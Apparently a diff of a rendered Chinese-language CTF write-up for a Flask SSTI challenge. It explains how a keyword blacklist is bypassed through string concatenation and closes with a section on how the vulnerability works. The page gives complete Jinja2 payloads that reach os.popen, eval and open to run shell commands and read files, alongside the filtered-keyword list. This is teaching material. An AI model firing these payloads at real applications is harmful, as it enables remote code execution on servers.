@@ -4136,7 +4136,7 @@
 <p>先试一下 <code>{{7*7}}</code>，返回的是 <code>nonono</code>。</p>
 <p><strong>这个 <code>nonono</code> 就明确了我们的思路是对的，只不过有东西被过滤了。</strong></p>
 <p>接着我去试，发现被过滤的有这些：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>*  eval  os  subprocess  popen  import  system  request  flag
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>*  eval  os  subprocess  popen  import  system  request  flag
 </span></code></pre></div>
 <p><strong>（是子串匹配、不分大小写。所以 <code>host</code> 这种词也会中招 —— 里面含 <code>os</code>。）</strong></p>
 <p><strong>能过的是：</strong><code>config</code> <code>self</code> <code>session</code> <code>url_for</code> <code>lipsum</code> <code>globals</code> <code>builtins</code> <code>class</code> <code>open</code> <code>cat</code> <code>read</code> <code>+</code></p>
@@ -4144,7 +4144,7 @@
 <h4 id="step-2-flask"><a class="toclink" href="../../gyctf2020-flaskapp-ssti/#step-2-flask">Step 2：确认是 Flask，先试短路</a></h4>
 <p>试试 <code>{{config}}</code>，出来了 Flask 的配置对象 —— 确认是 Flask（其实题名也提示了）。</p>
 <p>那先试试 <code>url_for</code> 能不能正常使用，结论是可行的：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>{{url_for}}   →  &lt;function url_for at 0x...&gt;
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>{{url_for}}   →  &lt;function url_for at 0x...&gt;
 </span></code></pre></div>
 <h4 id="step-3-net"><a class="toclink" href="../../gyctf2020-flaskapp-ssti/#step-3-net">Step 3：这里我卡住了 —— 页面没回显，Net 里看到重定向</a></h4>
 <p>接着再试 <code>{{url_for.__globals__}}</code>，<strong>但是页面没有回显</strong>，看了一下 Net 发现被重定向了。</p>
@@ -4152,48 +4152,48 @@
 <blockquote>
 <p><strong>后来搞明白了，记在这里：</strong></p>
 <p>这题用的是 <strong>POST-Redirect-GET</strong> 模式：</p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/decode'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span><span class="s1">'POST'</span><span class="p">])</span>
-</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a><span class="k">def</span><span class="w"> </span><span class="nf">decode</span><span class="p">():</span>
-</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a>    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">'GET'</span><span class="p">:</span>
-</span><span id="__span-56-4"><a id="__codelineno-56-4" name="__codelineno-56-4" href="#__codelineno-56-4"></a>        <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="s1">'res'</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>
-</span><span id="__span-56-5"><a id="__codelineno-56-5" name="__codelineno-56-5" href="#__codelineno-56-5"></a>        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'decode.html'</span><span class="p">,</span> <span class="n">res</span><span class="o">=</span><span class="n">res</span><span class="p">)</span>
-</span><span id="__span-56-6"><a id="__codelineno-56-6" name="__codelineno-56-6" href="#__codelineno-56-6"></a>    <span class="k">else</span><span class="p">:</span>
-</span><span id="__span-56-7"><a id="__codelineno-56-7" name="__codelineno-56-7" href="#__codelineno-56-7"></a>        <span class="n">res</span> <span class="o">=</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">'text'</span><span class="p">])</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
-</span><span id="__span-56-8"><a id="__codelineno-56-8" name="__codelineno-56-8" href="#__codelineno-56-8"></a>        <span class="n">session</span><span class="p">[</span><span class="s1">'res'</span><span class="p">]</span> <span class="o">=</span> <span class="n">res</span>          <span class="c1"># 结果塞进 session（flash）</span>
-</span><span id="__span-56-9"><a id="__codelineno-56-9" name="__codelineno-56-9" href="#__codelineno-56-9"></a>        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s1">'/decode'</span><span class="p">)</span>    <span class="c1"># 302</span>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">'/decode'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span><span class="s1">'POST'</span><span class="p">])</span>
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="k">def</span><span class="w"> </span><span class="nf">decode</span><span class="p">():</span>
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">'GET'</span><span class="p">:</span>
+</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>        <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="s1">'res'</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>
+</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'decode.html'</span><span class="p">,</span> <span class="n">res</span><span class="o">=</span><span class="n">res</span><span class="p">)</span>
+</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a>    <span class="k">else</span><span class="p">:</span>
+</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a>        <span class="n">res</span> <span class="o">=</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">'text'</span><span class="p">])</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span><span id="__span-20-8"><a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a>        <span class="n">session</span><span class="p">[</span><span class="s1">'res'</span><span class="p">]</span> <span class="o">=</span> <span class="n">res</span>          <span class="c1"># 结果塞进 session（flash）</span>
+</span><span id="__span-20-9"><a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a>        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s1">'/decode'</span><span class="p">)</span>    <span class="c1"># 302</span>
 </span></code></pre></div>
 <p><strong>所以：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>① 你看到的"结果"在重定向之后的 GET 页面里，不在 302 那个响应里
-</span><span id="__span-57-2"><a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a>② 那一大串 cookie 就是 session —— 结果（可能很长）就装在里面
-</span><span id="__span-57-3"><a id="__codelineno-57-3" name="__codelineno-57-3" href="#__codelineno-57-3"></a>③ 结果越长，cookie 越大
+<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>① 你看到的"结果"在重定向之后的 GET 页面里，不在 302 那个响应里
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>② 那一大串 cookie 就是 session —— 结果（可能很长）就装在里面
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>③ 结果越长，cookie 越大
 </span></code></pre></div>
 <p><strong>我看到的"没回显"，其实是在看 302 的响应体（内容是 <code>Redirecting...</code>）。</strong>跟过滤无关，是流程问题。</p>
 </blockquote>
 <h4 id="step-4"><a class="toclink" href="../../gyctf2020-flaskapp-ssti/#step-4">Step 4：短路打通</a></h4>
 <p><code>url_for.__globals__</code> 本身是通的，卡住的是<strong>再往下取 <code>['os']</code></strong> —— 因为 <code>os</code> 在名单里。</p>
 <p><strong>但 <code>+</code> 没被过滤，所以可以拼：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>{{url_for.__globals__['o'+'s']}}
-</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a>→  &lt;module 'os' from '/usr/local/lib/python3.7/os.py'&gt;
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>{{url_for.__globals__['o'+'s']}}
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>→  &lt;module 'os' from '/usr/local/lib/python3.7/os.py'&gt;
 </span></code></pre></div>
 <p>这个又能正常回显了。</p>
 <h4 id="step-5"><a class="toclink" href="../../gyctf2020-flaskapp-ssti/#step-5">Step 5：先找文件名</a></h4>
 <p><code>popen</code> 被拦，所以也拼一下；然后<strong>先 <code>ls /</code></strong>，因为我们还不知道 flag 叫什么：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>{{url_for.__globals__['o'+'s']['p'+'open']('ls /').read()}}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>{{url_for.__globals__['o'+'s']['p'+'open']('ls /').read()}}
 </span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>app  bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc
-</span><span id="__span-60-2"><a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a>root  run  sbin  srv  sys  this_is_the_flag.txt  tmp  usr  var
+<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>app  bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>root  run  sbin  srv  sys  this_is_the_flag.txt  tmp  usr  var
 </span></code></pre></div>
 <p><strong>根目录下有个 <code>this_is_the_flag.txt</code>。文件名是这一步才知道的。</strong></p>
 <h4 id="step-6"><a class="toclink" href="../../gyctf2020-flaskapp-ssti/#step-6">Step 6：读出来</a></h4>
 <p>注意 <code>flag</code> 这个词也被拦，所以路径也要拼（<code>'this_is_the_fl'</code> + <code>'ag.txt'</code>）：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>{{url_for.__globals__['o'+'s']['p'+'open']('cat /this_is_the_fl'+'ag.txt').read()}}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>{{url_for.__globals__['o'+'s']['p'+'open']('cat /this_is_the_fl'+'ag.txt').read()}}
 </span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>CTF2{dba20aea-1830-4ecc-b055-b73a1d9ba4fa}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>CTF2{dba20aea-1830-4ecc-b055-b73a1d9ba4fa}
 </span></code></pre></div>
 <h4 id="step-7"><a class="toclink" href="../../gyctf2020-flaskapp-ssti/#step-7">Step 7：换一条路（长链）</a></h4>
 <p>短路能通，是因为 Flask 注入了 <code>url_for</code>。<strong>换个环境把 <code>url_for</code> 删了，这条路就断。</strong>所以再走一遍长链——从字面量 <code>''</code> 开始爬。</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>{{''.__class__.__base__.__subclasses__()|selectattr('__name__','equalto','catch_warnings')|first}}
-</span><span id="__span-63-2"><a id="__codelineno-63-2" name="__codelineno-63-2" href="#__codelineno-63-2"></a>→  &lt;class '_py_warnings.catch_warnings'&gt;
+<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>{{''.__class__.__base__.__subclasses__()|selectattr('__name__','equalto','catch_warnings')|first}}
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>→  &lt;class '_py_warnings.catch_warnings'&gt;
 </span></code></pre></div>
 <p><strong>（<code>__name__</code> 是四个下划线；<code>name</code> 不出东西。另外 <code>equalto</code> 要加引号，不加会报 <code>no test named Undefined</code>。）</strong></p>
 <p>然后接 <code>['__init__']['__globals__']['__builtins__']</code>，拿到 builtins 的 dict。</p>
@@ -4202,34 +4202,34 @@
 <p><strong>答案：是 <code>"os"</code>。</strong></p>
 <p>我把 <code>import</code> 拆了、<code>popen</code> 拆了、<code>eval</code> 拆了，<strong>唯独把 <code>"os"</code> 原样写在了字符串里</strong> —— 那两个字面量照样会被匹配。</p>
 <p>拆开之后：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>('__imp'+'ort__("o"+"s").pop'+'en("ls /").read()')
+<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>('__imp'+'ort__("o"+"s").pop'+'en("ls /").read()')
 </span></code></pre></div>
 </blockquote>
 <p><strong>完整的一条：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>{{(''.__class__.__base__.__subclasses__()|selectattr('__name__','equalto','catch_warnings')|first)['__init__']['__globals__']['__builtins__']['eva'+'l']('__imp'+'ort__("o"+"s").pop'+'en("cat /this_is_the_fl"+"ag.txt").read()')}}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>{{(''.__class__.__base__.__subclasses__()|selectattr('__name__','equalto','catch_warnings')|first)['__init__']['__globals__']['__builtins__']['eva'+'l']('__imp'+'ort__("o"+"s").pop'+'en("cat /this_is_the_fl"+"ag.txt").read()')}}
 </span></code></pre></div>
 <p><strong>也是先 <code>ls /</code> 再 <code>cat</code>，一样拿不到名字就没法读。</strong></p>
 <hr />
 <h3 id="_3"><a class="toclink" href="../../gyctf2020-flaskapp-ssti/#_3">解题思路总结</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>加解密功能 → 解密的结果被当模板渲染
-</span><span id="__span-66-2"><a id="__codelineno-66-2" name="__codelineno-66-2" href="#__codelineno-66-2"></a>  → {{7*7}} 回 nonono → 有黑名单，但思路对
-</span><span id="__span-66-3"><a id="__codelineno-66-3" name="__codelineno-66-3" href="#__codelineno-66-3"></a>    → {{config}} 确认 Flask
-</span><span id="__span-66-4"><a id="__codelineno-66-4" name="__codelineno-66-4" href="#__codelineno-66-4"></a>      → url_for 能用 → 短路：url_for.__globals__
-</span><span id="__span-66-5"><a id="__codelineno-66-5" name="__codelineno-66-5" href="#__codelineno-66-5"></a>        → 卡在 ['os']（os 被拦）→ 拼成 ['o'+'s']
-</span><span id="__span-66-6"><a id="__codelineno-66-6" name="__codelineno-66-6" href="#__codelineno-66-6"></a>          → ls / 找到 this_is_the_flag.txt
-</span><span id="__span-66-7"><a id="__codelineno-66-7" name="__codelineno-66-7" href="#__codelineno-66-7"></a>            → cat 它（flag 也被拦，路径也拼）→ flag
-</span><span id="__span-66-8"><a id="__codelineno-66-8" name="__codelineno-66-8" href="#__codelineno-66-8"></a>              → 再走一遍长链验证：'' → subclasses → catch_warnings
-</span><span id="__span-66-9"><a id="__codelineno-66-9" name="__codelineno-66-9" href="#__codelineno-66-9"></a>                → __builtins__ → eval（import/os/popen 全要拆）→ flag
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>加解密功能 → 解密的结果被当模板渲染
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>  → {{7*7}} 回 nonono → 有黑名单，但思路对
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>    → {{config}} 确认 Flask
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>      → url_for 能用 → 短路：url_for.__globals__
+</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>        → 卡在 ['os']（os 被拦）→ 拼成 ['o'+'s']
+</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>          → ls / 找到 this_is_the_flag.txt
+</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>            → cat 它（flag 也被拦，路径也拼）→ flag
+</span><span id="__span-30-8"><a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a>              → 再走一遍长链验证：'' → subclasses → catch_warnings
+</span><span id="__span-30-9"><a id="__codelineno-30-9" name="__codelineno-30-9" href="#__codelineno-30-9"></a>                → __builtins__ → eval（import/os/popen 全要拆）→ flag
 </span></code></pre></div>
 <h4 id="_4"><a class="toclink" href="../../gyctf2020-flaskapp-ssti/#_4">漏洞原理</a></h4>
 <p><strong>① 解密结果被当成模板源码</strong></p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a><span class="n">res</span> <span class="o">=</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="n">res</span> <span class="o">=</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
 </span></code></pre></div>
 <p><strong>base64 只是把输入换了个形式，并没有让它变成"数据"。解密之后它照样进模板引擎求值。</strong></p>
 <p><strong>② 黑名单是"词"，绕过靠"拼接"</strong></p>
 <p>过滤器查的是<strong>你原文里有没有那串字母</strong>；Jinja 求值时会把 <code>+</code> 算掉，得到完整字符串。</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>原文：'o'+'s'      → 不含 os
-</span><span id="__span-68-2"><a id="__codelineno-68-2" name="__codelineno-68-2" href="#__codelineno-68-2"></a>求值：'os'          → 才是真正的属性名
+<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>原文：'o'+'s'      → 不含 os
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>求值：'os'          → 才是真正的属性名
 </span></code></pre></div>
 <p><strong>过滤看"字面"，执行看"结果"——这两者的差，就是绕过空间。</strong></p>
 <p><strong>③ 长链和短链的区别只在入口</strong></p>
@@ -4289,14 +4289,14 @@
 <details class="note">
 <summary>两条链的完整 payload（实测）</summary>
 <p><strong>短路（<code>url_for</code>）</strong></p>
-<div class="language-jinja highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a><span class="cp">{{</span><span class="nv">url_for.__globals__</span><span class="o">[</span><span class="s1">'o'</span><span class="o">+</span><span class="s1">'s'</span><span class="o">][</span><span class="s1">'p'</span><span class="o">+</span><span class="s1">'open'</span><span class="o">](</span><span class="s1">'ls /'</span><span class="o">)</span><span class="nv">.read</span><span class="o">()</span><span class="cp">}}</span>
-</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2" href="#__codelineno-69-2"></a><span class="cp">{{</span><span class="nv">url_for.__globals__</span><span class="o">[</span><span class="s1">'o'</span><span class="o">+</span><span class="s1">'s'</span><span class="o">][</span><span class="s1">'p'</span><span class="o">+</span><span class="s1">'open'</span><span class="o">](</span><span class="s1">'cat /this_is_the_fl'</span><span class="o">+</span><span class="s1">'ag.txt'</span><span class="o">)</span><span class="nv">.read</span><span class="o">()</span><span class="cp">}}</span>
+<div class="language-jinja highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="cp">{{</span><span class="nv">url_for.__globals__</span><span class="o">[</span><span class="s1">'o'</span><span class="o">+</span><span class="s1">'s'</span><span class="o">][</span><span class="s1">'p'</span><span class="o">+</span><span class="s1">'open'</span><span class="o">](</span><span class="s1">'ls /'</span><span class="o">)</span><span class="nv">.read</span><span class="o">()</span><span class="cp">}}</span>
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="cp">{{</span><span class="nv">url_for.__globals__</span><span class="o">[</span><span class="s1">'o'</span><span class="o">+</span><span class="s1">'s'</span><span class="o">][</span><span class="s1">'p'</span><span class="o">+</span><span class="s1">'open'</span><span class="o">](</span><span class="s1">'cat /this_is_the_fl'</span><span class="o">+</span><span class="s1">'ag.txt'</span><span class="o">)</span><span class="nv">.read</span><span class="o">()</span><span class="cp">}}</span>
 </span></code></pre></div>
 <p><strong>长链（<code>subclasses</code> + <code>eval</code>，双层拆分）</strong></p>
-<div class="language-jinja highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a><span class="cp">{{</span><span class="o">(</span><span class="s1">''</span><span class="nv">.__class__.__base__.__subclasses__</span><span class="o">()|</span><span class="nf">selectattr</span><span class="o">(</span><span class="s1">'__name__'</span><span class="o">,</span><span class="s1">'equalto'</span><span class="o">,</span><span class="s1">'catch_warnings'</span><span class="o">)|</span><span class="nf">first</span><span class="o">)[</span><span class="s1">'__init__'</span><span class="o">][</span><span class="s1">'__globals__'</span><span class="o">][</span><span class="s1">'__builtins__'</span><span class="o">][</span><span class="s1">'eva'</span><span class="o">+</span><span class="s1">'l'</span><span class="o">](</span><span class="s1">'__imp'</span><span class="o">+</span><span class="s1">'ort__("o"+"s").pop'</span><span class="o">+</span><span class="s1">'en("ls /").read()'</span><span class="o">)</span><span class="cp">}}</span>
+<div class="language-jinja highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="cp">{{</span><span class="o">(</span><span class="s1">''</span><span class="nv">.__class__.__base__.__subclasses__</span><span class="o">()|</span><span class="nf">selectattr</span><span class="o">(</span><span class="s1">'__name__'</span><span class="o">,</span><span class="s1">'equalto'</span><span class="o">,</span><span class="s1">'catch_warnings'</span><span class="o">)|</span><span class="nf">first</span><span class="o">)[</span><span class="s1">'__init__'</span><span class="o">][</span><span class="s1">'__globals__'</span><span class="o">][</span><span class="s1">'__builtins__'</span><span class="o">][</span><span class="s1">'eva'</span><span class="o">+</span><span class="s1">'l'</span><span class="o">](</span><span class="s1">'__imp'</span><span class="o">+</span><span class="s1">'ort__("o"+"s").pop'</span><span class="o">+</span><span class="s1">'en("ls /").read()'</span><span class="o">)</span><span class="cp">}}</span>
 </span></code></pre></div>
 <p><strong>长链（<code>subclasses</code> + <code>open</code>，只有一层拆分，更省事）</strong></p>
-<div class="language-jinja highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a><span class="cp">{{</span><span class="o">(</span><span class="s1">''</span><span class="nv">.__class__.__base__.__subclasses__</span><span class="o">()|</span><span class="nf">selectattr</span><span class="o">(</span><span class="s1">'__name__'</span><span class="o">,</span><span class="s1">'equalto'</span><span class="o">,</span><span class="s1">'catch_warnings'</span><span class="o">)|</span><span class="nf">first</span><span class="o">)[</span><span class="s1">'__init__'</span><span class="o">][</span><span class="s1">'__globals__'</span><span class="o">][</span><span class="s1">'__builtins__'</span><span class="o">][</span><span class="s1">'open'</span><span class="o">](</span><span class="s1">'/this_is_the_fl'</span><span class="o">+</span><span class="s1">'ag.txt'</span><span class="o">)</span><span class="nv">.read</span><span class="o">()</span><span class="cp">}}</span>
+<div class="language-jinja highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="cp">{{</span><span class="o">(</span><span class="s1">''</span><span class="nv">.__class__.__base__.__subclasses__</span><span class="o">()|</span><span class="nf">selectattr</span><span class="o">(</span><span class="s1">'__name__'</span><span class="o">,</span><span class="s1">'equalto'</span><span class="o">,</span><span class="s1">'catch_warnings'</span><span class="o">)|</span><span class="nf">first</span><span class="o">)[</span><span class="s1">'__init__'</span><span class="o">][</span><span class="s1">'__globals__'</span><span class="o">][</span><span class="s1">'__builtins__'</span><span class="o">][</span><span class="s1">'open'</span><span class="o">](</span><span class="s1">'/this_is_the_fl'</span><span class="o">+</span><span class="s1">'ag.txt'</span><span class="o">)</span><span class="nv">.read</span><span class="o">()</span><span class="cp">}}</span>
 </span></code></pre></div>
 <p><strong>注意：<code>open</code> 版必须先知道文件名（靠 <code>ls /</code>），而且不能执行命令，只能读文件。</strong></p>
 </details>
